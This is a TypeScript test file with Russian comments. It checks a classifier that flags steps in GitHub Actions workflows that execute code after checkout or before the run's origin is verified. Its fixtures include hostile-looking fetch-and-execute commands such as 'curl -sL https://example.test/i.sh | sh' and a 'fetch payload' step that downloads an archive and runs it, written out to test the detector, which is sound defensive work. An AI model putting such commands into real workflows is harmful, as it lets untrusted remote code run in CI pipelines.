import { describe, it, expect } from 'vitest';
import { riskyStepsInJob, type WorkflowJob, type WorkflowStep } from './helpers/workflows';

// Дефект B10 (docs/security-audit-2026-08-08.md): «исполнение выгруженного кода»
// опознавалось по СПИСКУ известных интерпретаторов
// (`npm|npx|yarn|pnpm|astro|vite|tsx|node`). Шаг `bash ./x.sh`, `make` или
// `./bin/foo` под него не подпадал, и проверки происхождения в
// deploy-gating.test.ts остались бы зелёными над реальной уязвимостью.
//
// Проверяется СИНТЕТИЧЕСКИЙ джоб, а не реальный workflow: настоящий build-job
// защищён условием на уровне джоба, поэтому добавленный туда `bash ./x.sh`
// остался бы недостижим для форка и гейт не покраснел бы — красное не доказывало
// бы работу классификатора.

function step(index: number, fields: Partial<WorkflowStep>): WorkflowStep {
  return {
    index,
    raw: JSON.stringify(fields),
    name: fields.name,
    uses: fields.uses,
    run: fields.run,
    if: fields.if,
    with: fields.with,
    env: fields.env,
  } as WorkflowStep;
}

function job(steps: WorkflowStep[]): WorkflowJob {
  return { key: 'build', if: undefined, needs: [], steps } as unknown as WorkflowJob;
}

const CHECKOUT = { uses: 'actions/checkout@v4' };
// Guard узнаётся по предмету: он читает происхождение прогона
// (`workflow_run.head_repository`) и роняет джоб. Только ему позволено выполняться
// до того, как происхождение установлено.
const GUARD = {
  name: 'verify origin',
  env: { HEAD_REPO: '${{ github.event.workflow_run.head_repository.full_name }}' },
  run: 'test "$HEAD_REPO" = "$GITHUB_REPOSITORY" || exit 1',
};

describe('riskyStepsInJob — исполнение после выгрузки кода', () => {
  // Общий признак, а не перечень интерпретаторов: список отстаёт от предмета молча.
  const afterCheckout: Array<[string, string]> = [
    ['bash-скрипт из репозитория', 'bash ./scripts/deploy.sh'],
    ['make', 'make build'],
    ['исполняемый файл из репозитория', './bin/check-openspec-integration'],
    ['загрузка и исполнение', 'curl -sL https://example.test/i.sh | sh'],
  ];

  for (const [label, run] of afterCheckout) {
    it(`после checkout считает исполнением: ${label}`, () => {
      const j = job([step(0, CHECKOUT), step(1, { run })]);
      const risky = riskyStepsInJob(j);
      expect(
        risky.map((s) => s.index),
        `шаг «${run}» после checkout не опознан как исполнение кода`,
      ).toContain(1);
    });
  }

  it('после checkout считает исполнением локальный action (uses: ./…)', () => {
    const j = job([step(0, CHECKOUT), step(1, { uses: './.github/actions/build' })]);
    expect(
      riskyStepsInJob(j).map((s) => s.index),
      'локальный action — это код из checkout’а, он должен считаться исполнением',
    ).toContain(1);
  });

  it('сам шаг выгрузки остаётся в списке', () => {
    const j = job([step(0, CHECKOUT), step(1, { run: 'bash ./x.sh' })]);
    expect(riskyStepsInJob(j).map((s) => s.index)).toContain(0);
  });

  // Связка «скачал и исполнил» ДО checkout. Прежнее правило её не видело: шага
  // выгрузки из известного списка (checkout/download-artifact/git) здесь нет, а
  // перечень интерпретаторов не покрывает ни `curl`, ни `tar`, ни `bash ./payload.sh`.
  // Именно поэтому правило больше не опирается на списки.
  it('скачивание и исполнение ДО checkout считаются опасными', () => {
    const j = job([
      step(0, { name: 'fetch payload', run: 'curl -sL "$ARCHIVE_URL" | tar -xz -C .' }),
      step(1, { run: 'bash ./payload.sh' }),
      step(2, CHECKOUT),
    ]);
    const risky = riskyStepsInJob(j).map((s) => s.index);
    expect(risky, 'скачивание чужого архива до checkout не опознано').toContain(0);
    expect(risky, 'исполнение скачанного до checkout не опознано').toContain(1);
  });

  it('сторонний action до проверки происхождения тоже опасен', () => {
    const j = job([step(0, { uses: 'some/third-party-action@v1' }), step(1, CHECKOUT)]);
    expect(riskyStepsInJob(j).map((s) => s.index)).toContain(0);
  });
});

describe('riskyStepsInJob — джоб-вызов reusable workflow', () => {
  // У такого джоба ШАГОВ НЕТ вовсе: весь код внутри вызванного workflow. Пока модель
  // хранила только `steps`, он давал пустой список и молча проходил обе проверки
  // происхождения — приёмник `workflow_run` без guard'а был для гейта невидим.
  it('вызов локального reusable workflow считается исполнением кода', () => {
    const j = { key: 'call', needs: [], steps: [], uses: './.github/workflows/build.yml' } as
      unknown as WorkflowJob;
    expect(
      riskyStepsInJob(j).length,
      'джоб без шагов, вызывающий reusable workflow, не опознан как исполняющий код',
    ).toBe(1);
  });

  it('вызов стороннего reusable workflow тоже считается исполнением', () => {
    const j = { key: 'call', needs: [], steps: [], uses: 'other/repo/.github/workflows/x.yml@v1' } as
      unknown as WorkflowJob;
    expect(riskyStepsInJob(j).length).toBe(1);
  });

  it('обычный джоб без job-level uses не получает лишнего шага', () => {
    const j = job([step(0, CHECKOUT)]);
    expect(riskyStepsInJob(j).map((s) => s.uses)).toEqual(['actions/checkout@v4']);
  });
});

describe('riskyStepsInJob — исключений нет ни для одного шага', () => {
  // Прежде шаг, похожий на проверку происхождения, исключался целиком. Это само было
  // дырой: сверка и исполнение чужого кода умещаются в ОДНУ команду, и тогда шаг
  // получал признаки guard'а, а исполнение внутри него становилось невидимым.
  it('сверка происхождения внутри шага не делает шаг безопасным', () => {
    const j = job([
      step(0, {
        name: 'looks like a guard',
        env: { HEAD_REPO: '${{ github.event.workflow_run.head_repository.full_name }}' },
        run: 'curl -sL "$URL" | bash\ntest "$HEAD_REPO" = "$GITHUB_REPOSITORY" || exit 1',
      }),
      step(1, CHECKOUT),
    ]);
    expect(
      riskyStepsInJob(j).map((s) => s.index),
      'шаг исполняет чужой код ДО сверки, но был признан guard’ом и исключён',
    ).toContain(0);
  });

  it('обычный guard-шаг тоже считается опасным — защита обязана быть на уровне джоба', () => {
    const j = job([step(0, GUARD), step(1, { run: 'echo hello' })]);
    expect(riskyStepsInJob(j).map((s) => s.index)).toEqual([0, 1]);
  });
});
